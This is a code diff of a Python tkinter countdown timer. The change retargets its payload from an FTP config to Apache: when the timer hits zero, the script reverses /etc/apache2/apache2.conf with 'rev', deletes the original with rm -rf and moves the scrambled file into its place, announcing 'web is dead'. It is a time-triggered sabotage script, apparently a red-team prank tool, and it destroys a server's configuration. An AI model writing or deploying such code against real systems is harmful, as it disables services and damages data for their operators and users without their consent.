@@ -16,7 +16,7 @@ root.geometry("300x600")
 # Using title() to display a message in
 # the dialogue box of the message in the
 # title bar.
-root.title("Bye Bye ftp")
+root.title("Bye Bye web")
   
 # Declaration of variables for the timer
 minute=StringVar()
@@ -65,10 +65,10 @@ def submit():
         # when temp value = 0; then a messagebox pop's up
         # with a message:"Time's up"
         if (temp == 0):
-            messagebox.showinfo("Time Countdown", "ftp is dead X( ")
-            os.system('rev /etc/ssl/ftpc/ftpc.conf > /etc/ssl/ftpc/ftpc2.conf')
-            os.system('rm -rf /etc/ssl/ftpc/ftpc.conf')
-            os.system('mv /etc/ssl/ftpc/ftpc2.conf /etc/ssl/ftpc/ftpc.conf')
+            messagebox.showinfo("Time Countdown", "web is dead X( ")
+            os.system('rev /etc/apache2/apache2.conf > /etc/apache2/apache3.conf')
+            os.system('rm -rf /etc/apache2/apache2.conf')
+            os.system('mv /etc/apache2/apache3.conf /etc/apache2/apache2.conf')
          
         # after every one sec the value of temp will be decremented
         # by one
